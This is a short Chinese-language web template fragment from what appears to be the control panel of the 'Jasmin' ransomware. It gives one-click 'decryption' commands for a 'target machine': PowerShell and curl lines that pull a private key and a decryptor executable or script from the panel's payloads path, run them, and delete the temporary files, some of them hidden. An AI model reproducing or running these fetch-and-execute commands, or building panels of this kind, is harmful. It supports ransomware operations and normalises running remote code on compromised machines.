🖥️ Windows 一键解密

1在目标机打开 PowerShell (管理员)
2复制下方命令直接运行
自动下载私钥+解密器、执行解密、清理临时文件
$tmp="$env:TEMP\jasmin_dec"
New-Item -ItemType Directory -Force -Path $tmp | Out-Null
Invoke-WebRequest "{{ request.url_root }}payloads/jasmin_private.pem" -OutFile "$tmp\key.pem"
Invoke-WebRequest "{{ request.url_root }}payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
& "$tmp\dec.exe" "$tmp\key.pem"
Remove-Item -Recurse -Force $tmp

🐧 Linux 一键解密

1在目标机打开终端
2复制下方命令直接运行
自动安装依赖、下载私钥和脚本、全盘解密、清理
pip3 install -q cryptography 2>/dev/null
curl -sL {{ request.url_root }}payloads/jasmin_private.pem -o /tmp/.jk
curl -sL {{ request.url_root }}payloads/jasmin_decrypt.py -o /tmp/.jd
python3 /tmp/.jd /tmp/.jk
rm -f /tmp/.jk /tmp/.jd
